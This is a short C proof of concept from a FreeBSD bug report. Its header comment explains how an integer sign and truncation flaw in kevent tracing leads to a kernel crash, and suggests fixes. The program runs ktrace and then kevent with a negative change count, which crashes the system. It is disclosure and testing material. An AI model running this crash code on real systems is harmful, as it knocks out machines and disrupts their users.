/*
 * keventCrash.c
 *    Crash FreeBSD by tracing kevent with unusual parameters.

Reported: 20170228 https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=217435

Synopsis:
Tracing sys_kevent calls with unusual arguments leads to an overly
large allocation request that leads to a general protection fault.

Description:
sys_kevent tries to trace with this code before doing the syscall:

    if (KTRPOINT(td, KTR_GENIO)) {
        ktriov.iov_base = uap->changelist;
        ktriov.iov_len = uap->nchanges * sizeof(struct kevent);
        ktruio = (struct uio){ .uio_iov = &ktriov, .uio_iovcnt = 1,
            .uio_segflg = UIO_USERSPACE, .uio_rw = UIO_READ,
            .uio_td = td };
        ktruioin = cloneuio(&ktruio);
        ktriov.iov_base = uap->eventlist;
        ktriov.iov_len = uap->nevents * sizeof(struct kevent);
        ktruioout = cloneuio(&ktruio);
    }

and this code after doing the syscall:

    if (ktruioin != NULL) {
        ktruioin->uio_resid = uap->nchanges * sizeof(struct kevent);
        ktrgenio(uap->fd, UIO_WRITE, ktruioin, 0);
        ktruioout->uio_resid = td->td_retval[0] * sizeof(struct kevent);
        ktrgenio(uap->fd, UIO_READ, ktruioout, error);
    }

here uap->nchanges nad upa->nevents are signed integers,
iov_len is a size_t (unsigned) and uio_resid is a ssize_t (signed).  
Later in ktrgenio an int datalen is computed:

    datalen = MIN(uio->uio_resid, ktr_geniosize);
    buf = malloc(datalen, M_KTRACE, M_WAITOK);

which truncates uio_resid to 32-bits and allocates from it.
malloc will treat datalen as "unsigned long", sign extending
it to a very large number.  This causes errors in malloc
resulting in a crash.

Recommendation:
Rejected negative values of "nchanges" and "nevents" in sys_kevent.
Make "datalen" an unsigned long in ktrgenio.
Consider rejecting overly large allocation requests in malloc.

 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <sys/ktrace.h>

void xperror(char *msg) 
{
    perror(msg);
    exit(1);
}

int main(int argc, char **argv)
{
    char *fn = "/tmp/trace";
    struct kevent changes[1] = { {0} };
    struct kevent events[1] = { {0} };
    
    if(open(fn, O_RDWR | O_CREAT, 0666) == -1)
        xperror(fn);
    if(ktrace(fn, KTRFLAG_DESCEND | KTROP_SET, KTRFAC_GENIO, 0) == -1)
        xperror("ktrace");
    if(kevent(0, changes, -1, events, 1, 0) == -1) 
        xperror("kevent");
    printf("done\n");
    return 0;
}

